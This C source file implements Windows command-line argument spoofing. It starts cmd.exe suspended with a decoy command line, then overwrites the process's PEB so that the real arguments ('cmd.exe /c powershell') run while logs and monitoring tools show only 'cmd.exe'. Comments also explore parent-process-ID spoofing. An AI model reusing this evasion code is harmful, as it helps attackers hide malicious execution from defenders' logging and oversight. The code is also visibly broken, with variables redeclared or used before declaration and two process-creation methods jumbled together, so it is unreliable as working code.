#include <Windows.h>
#include <stdio.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

#define MAX_STR 32767

// Arguments that get displayed in the logs
// System Informer will display the most recent modification, so if that's a
// concern, set this to a substring of the real arguments
LPCWSTR FakeCommandLine = L"cmd.exe";
// Path to real executable
LPCWSTR NtImagePath = L"\\??\\C:\\Windows\\System32\\cmd.exe";
// Real options we start the command with
LPCWSTR RealCommandLine = L"cmd.exe /c powershell";

int main(int argc, char** argv) {
    USHORT fakeCommandLineLength = lstrlenW(FakeCommandLine) * sizeof(WCHAR);
    USHORT realCommandLineLength = lstrlenW(RealCommandLine) * sizeof(WCHAR);

    // Set up unicode strings
    UNICODE_STRING UFakeCommandLine;
    RtlInitUnicodeString(&UFakeCommandLine, (PWSTR)FakeCommandLine);
    UNICODE_STRING URealCommandLine;
    RtlInitUnicodeString(&URealCommandLine, (PWSTR)RealCommandLine);

    printf("Real: %d %d %ls\n", URealCommandLine.Length, URealCommandLine.MaximumLength, URealCommandLine.Buffer);
    printf("Fake: %d %d %ls\n", UFakeCommandLine.Length, UFakeCommandLine.MaximumLength, UFakeCommandLine.Buffer);

    UNICODE_STRING UNtImagePath;
    RtlInitUnicodeString(&UNtImagePath, (PWSTR)NtImagePath);

    // Process parameters let us customise our process's configuration
    // We only need the ones that are defined
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    // Can we spoof image name too? Update: no, when calc is used here command prompt gets DNS errors, and when calc is used in the other place calc starts
    RtlCreateProcessParametersEx(&ProcessParameters, &UNtImagePath, NULL, NULL, &UFakeCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    // Initialize the PS_CREATE_INFO structure
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
    PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));

    // Initialize the PS_ATTRIBUTE_LIST structure
    // We use this to pass other important data to the new process
    // Just using it for the image name at the moment (this appears to be the main place it's important)
    // Is it possible to use PS_ATTRIBUTE_PARENT_PROCESS for PPID spoofing?
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
    AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
    AttributeList->Attributes[0].ValuePtr = clientId;

    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
    AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
    AttributeList->Attributes[1].ValuePtr = SecImgInfo;

    // Second usage of NtImagePath
    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[2].Size = UNtImagePath.Length;
    AttributeList->Attributes[2].ValuePtr = UNtImagePath.Buffer;

    AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
    AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
    AttributeList->Attributes[3].ValuePtr = stdHandleInfo;

    // Can be used for PPID spoofing if we have a handle to another process
    HANDLE hParent = GetCurrentProcess();
    if (hParent)
    {
        AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
        AttributeList->Attributes[4].Size = sizeof(HANDLE);
        AttributeList->Attributes[4].ValuePtr = hParent;
    }
    else
    {
        AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
    }

    // Create the process
    // Make sure to start the thread suspended so we don't risk a race condition
    HANDLE hProcess, hThread = NULL;
    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, &objAttr, &objAttr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);

    // PREPARE FIELDS
    // Parent
    HANDLE hParent = GetCurrentProcess();
    if (hParent == NULL) {
        printf("Could not get access to own handle.\n");
        return 1;
    }

    // OPEN EXECUTABLE
    HANDLE hFile = NULL;

    OBJECT_ATTRIBUTES oa = OBJECT_ATTRIBUTES{ 0 };
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    oa.ObjectName = &UNtImagePath;

    IO_STATUS_BLOCK isb;
    NTSTATUS status = NtOpenFile(&hFile, GENERIC_READ | GENERIC_EXECUTE, &oa, &isb, FILE_SHARE_READ, 0);

    // CREATE SECTION
    HANDLE hSection = NULL;
    status = NtCreateSection(&hSection, SECTION_MAP_EXECUTE, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);

    // CREATE PROCESS
    status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

    // POPULATE PEB
    PROCESS_BASIC_INFORMATION pbi;
    PEB pebLocal;
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // Read the PEB from the target process
    success = ReadProcessMemory(hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
    if (!success) {
        printf("Could not call ReadProcessMemory to grab PEB\n");
        return 1;
    }

    status = NtSetInformationProcess(hProcess, ProcessCommandLine, pbi, sizeof(pbi));

    // Clean up
    // Free up the heap and destroy the parameters we don't need anymore
    //RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
    //RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
    //RtlFreeHeap(RtlProcessHeap(), 0, clientId);
    //RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
    //RtlDestroyProcessParameters(ProcessParameters);


    // READ STARTUP INFO
    STARTUPINFOA si = { 0 };
    CONTEXT context;
    BOOL success;
    DWORD retLen;
    SIZE_T bytesRead, bytesWritten;
    RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };

    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // Grab the ProcessParameters from PEB
    ReadProcessMemory(hProcess, pebLocal.ProcessParameters, &parameters, sizeof(parameters), &bytesRead);
    if (parameters.CommandLine.Buffer == NULL) {
        printf("Commandline arguments appear to be null?\n");
        return 1;
    }

    // Set the actual arguments we are looking to use
    // Hey look it's our buffer from earlier
    success = WriteProcessMemory(hProcess, parameters.CommandLine.Buffer, URealCommandLine.Buffer, URealCommandLine.Length, &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to update commandline args\n");
        return 1;
    }

    // This new value can only be smaller
    success = WriteProcessMemory(hProcess, (char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), (void*)&fakeCommandLineLength, 4, &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to update commandline arg length\n");
        return 1;
    }



    // Resume thread execution
    ResumeThread(hThread);


    // Secuirty
    system("pause");
}